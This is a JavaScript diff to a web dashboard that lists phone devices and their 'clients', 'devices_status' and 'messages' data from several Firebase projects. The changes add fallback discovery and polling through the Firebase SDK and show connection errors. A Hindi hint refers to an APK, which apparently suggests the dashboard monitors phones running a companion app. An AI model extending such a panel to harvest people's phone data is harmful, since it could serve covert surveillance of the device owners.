@@ -598,6 +598,37 @@ function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',de
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
+function isFirebaseErr(data){
+  return !!(data&&typeof data==='object'&&data.error&&Object.keys(data).length<=2);
+}
+function discoverViaSdk(inst){
+  if(!inst||!inst.db) return Promise.resolve(null);
+  var paths=['clients','devices','devices_status','messages'];
+  return Promise.all(paths.map(function(p){
+    return inst.db.ref(p).limitToFirst(1).once('value').then(function(s){return s.exists()?p:null;}).catch(function(){return null;});
+  })).then(function(found){
+    found=found.filter(Boolean);
+    if(!found.length) return null;
+    var roots={};
+    found.forEach(function(p){roots[p]=true;});
+    return roots;
+  }).catch(function(err){
+    inst.connError=err.message||'SDK connection failed';
+    return null;
+  });
+}
+function runDiscoveryTasks(inst,roots){
+  if(!roots||typeof roots!=='object'){inst.discoveredNodes=[];return Promise.resolve();}
+  if(isFirebaseErr(roots)){inst.connError=String(roots.error);inst.discoveredNodes=[];return Promise.resolve();}
+  inst.connError='';
+  inst.discoveredNodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0&&n!=='error';});
+  var tasks=[];
+  inst.discoveredNodes.forEach(function(node){
+    if(SUMMARY_NODES.indexOf(node)>=0) tasks.push(fetchSummaryNode(inst,node));
+    else if(node==='devices'||DEVICE_NODES.indexOf(node)>=0) tasks.push(fetchDevicesFast(inst,node));
+  });
+  return Promise.all(tasks).then(function(){setClientsCacheForFb(inst.id);});
+}
 function testFirebaseRoots(url){
   var base=String(url||'').replace(/\/+$/,'').replace(/\.json(\?.*)?$/i,'');
   return fetch(base+'/.json?shallow=true',{cache:'no-store'}).then(function(r){
@@ -656,7 +687,8 @@ function initFirebaseInstance(cfg){
     }catch(e){console.error('FB init error',cfg.id,e);}
   }
   var inst={id:cfg.id,name:cfg.name,config:cfg,appName:appName,db:db,
-    restUrl:cfg.databaseURL.replace(/\/$/,''),discoveredNodes:[],liveAttached:false,deviceLiveAttached:{}};
+    restUrl:cfg.databaseURL.replace(/\/$/,''),discoveredNodes:[],liveAttached:false,deviceLiveAttached:{},
+    connError:'',sdkPollAttached:false};
   inst.schema=getFbSchema(inst);
   firebaseInstances.push(inst);
   return inst;
@@ -1074,20 +1106,46 @@ function fetchSummaryNode(inst,nodeName){
     applyFbData(inst);
   });
 }
+function fetchNodeViaSdk(inst,node){
+  if(!inst.db) return Promise.resolve();
+  return inst.db.ref(node).once('value').then(function(s){
+    if(!s.exists()) return;
+    mergeSummaryNode(inst.id,node,s.val());
+    applyFbData(inst);
+    if(inst.discoveredNodes.indexOf(node)<0) inst.discoveredNodes.push(node);
+  });
+}
 function discoverAndFetchInstance(inst){
   return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
-    if(!roots||typeof roots!=='object'){inst.discoveredNodes=[];return;}
-    inst.discoveredNodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
-    var tasks=[];
-    inst.discoveredNodes.forEach(function(node){
-      if(SUMMARY_NODES.indexOf(node)>=0) tasks.push(fetchSummaryNode(inst,node));
-      else if(node==='devices'||DEVICE_NODES.indexOf(node)>=0) tasks.push(fetchDevicesFast(inst,node));
-    });
-    return Promise.all(tasks).then(function(){setClientsCacheForFb(inst.id);});
+    if(isFirebaseErr(roots)){
+      inst.connError=String(roots.error);
+      return discoverViaSdk(inst).then(function(sdkRoots){
+        if(sdkRoots) return runDiscoveryTasks(inst,sdkRoots);
+        return Promise.all([
+          fetchNodeViaSdk(inst,'clients'),
+          fetchNodeViaSdk(inst,'devices_status')
+        ]).then(function(){setClientsCacheForFb(inst.id);});
+      });
+    }
+    if(!roots||typeof roots!=='object'){
+      return discoverViaSdk(inst).then(function(sdkRoots){return runDiscoveryTasks(inst,sdkRoots);});
+    }
+    return runDiscoveryTasks(inst,roots);
   });
 }
 function attachRestPolling(inst){
-  if(inst.pollTimer||inst.db) return;
+  if(inst.pollTimer) return;
+  if(inst.db){
+    if(inst.sdkPollAttached) return;
+    inst.sdkPollAttached=true;
+    function sdkPoll(){
+      fetchNodeViaSdk(inst,'clients');
+      fetchNodeViaSdk(inst,'devices_status');
+    }
+    sdkPoll();
+    inst.pollTimer=setInterval(sdkPoll,8000);
+    return;
+  }
   var pollMs=inst.schema==='rabel'?3000:8000;
   function poll(){
     restJson(inst.restUrl+'/clients.json').then(function(raw){
@@ -1145,11 +1203,18 @@ function attachDeviceLiveListeners(inst,nodeName,ids){
 function attachClientsLiveUpdates(inst){
   if(!inst.db||inst.liveAttached) return;
   inst.liveAttached=true;
+  inst.db.ref('devices_status').once('value').then(function(s){
+    if(s.exists()){mergeSummaryNode(inst.id,'devices_status',s.val());applyFbData(inst);}
+  });
   inst.db.ref('devices_status').on('value',function(s){
     if(!s.exists()) return;
     mergeSummaryNode(inst.id,'devices_status',s.val()); applyFbData(inst);
   });
   ['clients'].forEach(function(node){
+    inst.db.ref(node).once('value').then(function(s){
+      if(s.exists()) mergeSummaryNode(inst.id,node,s.val());
+      applyFbData(inst);
+    });
     inst.db.ref(node).on('child_added',function(s){ingestDeviceData(inst.id,node,s.key,s.val());applyFbData(inst);});
     inst.db.ref(node).on('child_changed',function(s){ingestDeviceData(inst.id,node,s.key,s.val());applyFbData(inst);});
     inst.db.ref(node).on('child_removed',function(s){delete clientsRawMap[makeDevKey(inst.id,s.key)];applyFbData(inst);});
@@ -1225,7 +1290,14 @@ function renderSidebar(){
   var inst=getFbInstance(activeFbId);
   var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.id+d.brand+d.rawId).toLowerCase().includes(q);});
   if(!list.length){
-    el.innerHTML='<div class="dev-empty">'+ico('📡','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span></div>';
+    var errMsg='';
+    if(inst&&inst.connError){
+      errMsg='<br><span style="color:var(--error);margin-top:8px;display:block;font-size:9px">⚠ '+esc(inst.connError)+'</span>';
+      if(/deactivated|suspended/i.test(inst.connError)){
+        errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK mein purana cached data dikh sakta hai. Firebase Console se database enable karo.</span>';
+      }
+    }
+    el.innerHTML='<div class="dev-empty">'+ico('📡','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span>'+errMsg+'</div>';
     return;
   }
   window._sidebarList=list;
@@ -1722,8 +1794,9 @@ function renderFirebaseList(){
   el.innerHTML=firebaseConfigs.map(function(cfg){
     var inst=getFbInstance(cfg.id);
     var nodes=inst&&inst.discoveredNodes.length?inst.discoveredNodes.join(', '):'discovering...';
+    var st=inst&&inst.connError?'<div class="fb-item-url" style="color:var(--error)">⚠ '+esc(inst.connError)+'</div>':'';
     return '<div class="fb-item"><div><div class="fb-item-name">'+esc(cfg.name)+'</div>'+
-      '<div class="fb-item-secure">'+ico('🔒','i3d-green i3d-sm i3d-static')+' Secure · URL hidden</div>'+
+      '<div class="fb-item-secure">'+ico('🔒','i3d-green i3d-sm i3d-static')+' Secure · URL hidden</div>'+st+
       '<div class="fb-item-nodes">'+ico('📂','i3d-orange i3d-sm i3d-static')+' Nodes: '+esc(nodes)+'</div></div>'+
       (PROTECTED_FB_IDS.indexOf(cfg.id)<0?'<button class="fb-del" onclick="removeFirebaseProject(\''+cfg.id+'\')">✕</button>':'')+
       '</div>';
